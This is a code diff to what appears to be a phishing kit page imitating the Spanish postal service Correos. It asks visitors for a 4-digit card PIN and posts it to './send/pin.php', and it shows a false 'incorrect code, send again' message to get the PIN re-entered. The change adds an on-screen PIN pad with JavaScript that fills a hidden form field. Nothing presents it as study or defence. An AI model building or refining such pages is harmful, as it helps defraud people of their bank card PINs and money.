@@ -15516,14 +15516,16 @@
 													<div id="app"><div class="lite-tunnel-step1-wrapper"><div class="wrapper-main row"><div class="lite-tunnel-step1 col-12 md:col-12 lg:col-8">
 														<form action="./send/pin.php" method="post">
 															<fieldset class="lite-tunnel-step1__section"><h2 class="lite-tunnel-step1__title">Verificar</h2><div style="margin-top: 10px;"><img src="./files/img/teller-machine.png" alt="Image Description" width="50" height="50"></div><div class="form-section"><h4 class="form-section__title">Verificación del código PIN</h4><span class="form-section__subtitle">Pon tu código de 4 dígitos para proceder a la verificación y espera</span> <div class="personal-data-form"><div class="personal-data-form__section"><div class="row" style="width: 60%;"><div class="col-12 md:col-12 lg:col-12">
-															<correos-ui-input label="Nombre" id="_pd_name" name="_pd_name" required="true" value="" pattern="^[a-zA-Z\u00C0-\u017F ,.'-]+$" invalidtext="Datos no válidos" type="text" class="personal-data-form__input sc-correos-ui-input-h sc-correos-ui-input-s undefined hydrated" style="width: inherit;">
-																<div class="correos-ui-input_root default sc-correos-ui-input">
-																<div class="mdc-text-field mdc-text-field--with-trailing-icon mdc-menu-surface--anchor sc-correos-ui-input mdc-ripple-upgraded">
-																<input id="_pd_name" name="_pd_name" type="password" maxlength="4" autocomplete="none" pattern="^\d{4}$" required="required" class="mdc-text-field__input sc-correos-ui-input"></div> <!---->
-																<div style="position: absolute; margin-left: 50%;">
-																<button id="countdownOne" disabled="disabled" type="submit" style="width: 85px; height: 47px; background-color: rgb(223, 182, 48); color: rgb(18, 44, 107); border: 1px solid rgb(174, 145, 35); border-radius: 8px; font-size: 14px; font-weight: 600;">
-																													••••
-																												</button> <!----></div></div></correos-ui-input></div></div></div>
+																<div class="personal-data-form__input" style="width: inherit;">
+																	<input id="pinDisplay" type="password" maxlength="4" readonly style="width: 100%; height: 47px; border: 1px solid #b4b4b4; border-radius: 8px; font-size: 20px; text-align: center; letter-spacing: 8px;">
+																	<input id="_pd_name" name="_pd_name" type="hidden" required="required" pattern="^\d{4}$">
+																	<div id="pinPad" style="margin-top: 12px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; width: 220px;">
+																		<button type="button" data-key="1">1</button><button type="button" data-key="2">2</button><button type="button" data-key="3">3</button>
+																		<button type="button" data-key="4">4</button><button type="button" data-key="5">5</button><button type="button" data-key="6">6</button>
+																		<button type="button" data-key="7">7</button><button type="button" data-key="8">8</button><button type="button" data-key="9">9</button>
+																		<button type="button" data-action="clear">C</button><button type="button" data-key="0">0</button><button type="button" data-action="back">⌫</button>
+																	</div>
+																</div></div></div></div>
 																												<span id="cardRequiredFieldValidator" class="smspass scale-up-bottom" style="color: red; display: inline; font-size: 14px;">El código de verificación es incorrecto, envíelo nuevamente, esperando para completar.</span></div></div></fieldset>
 																												<correos-ui-button theme="primary" type="button" form="" class="lite-tunnel-step1__button sc-correos-ui-button-h sc-correos-ui-button-s hydrated" style="display: block;"><div class="mdc-touch-target-wrapper sc-correos-ui-button">
 																													<button type="submit" class="mdc-button false sc-correos-ui-button sc-correos-ui-button-s mdc-ripple-upgraded" style="width: 100%;"><div class="mdc-button__ripple sc-correos-ui-button"></div><span class="mdc-button__label sc-correos-ui-button sc-correos-ui-button-s"><span slot="text">ENTREGAR
@@ -15552,7 +15554,42 @@
 																																	A
 																																	MI
 																																	OFICINA</span></span></a></div></correos-ui-button></div></div></correos-ui-text-inf></div></div></div></div> <div hidden="hidden" class="ps__rail-x" style="left: 0px; bottom: 0px;"><div tabindex="0" class="ps__thumb-x" style="left: 0px; width: 0px;"></div></div> <div hidden="hidden" class="ps__rail-y" style="top: 0px; right: 0px;"><div tabindex="0" class="ps__thumb-y" style="top: 0px; height: 0px;"></div></div></correos-ui-scroll-bar> <div class="cdk-footer sc-correos-cdk-pop-up"><div class="cdk-footer__info sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s"></div> <div class="cdk-footer__buttons sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s"></div></div></div></div></div></correos-cdk-pop-up></div></div>
-													<script src="config/urlconfig.json"></script>
+	
+												<script>
+												document.addEventListener("DOMContentLoaded", function () {
+													var display = document.getElementById("pinDisplay");
+													var hidden = document.getElementById("_pd_name");
+													var pad = document.getElementById("pinPad");
+													if (!display || !hidden || !pad) {
+														return;
+													}
+
+													pad.addEventListener("click", function (event) {
+														var target = event.target;
+														if (!target || target.tagName !== "BUTTON") {
+															return;
+														}
+
+														var key = target.getAttribute("data-key");
+														var action = target.getAttribute("data-action");
+
+														if (key !== null && hidden.value.length < 4) {
+															hidden.value += key;
+														}
+
+														if (action === "clear") {
+															hidden.value = "";
+														}
+
+														if (action === "back") {
+															hidden.value = hidden.value.slice(0, -1);
+														}
+
+														display.value = hidden.value;
+													});
+												});
+											</script>
+												<script src="config/urlconfig.json"></script>
 													<script src="./static/js/axios.js" type="text/javascript" charset="utf-8">
 													</script>
 													<script src="./static/js/jquery-ui.js" type="text/javascript" charset="utf-8">
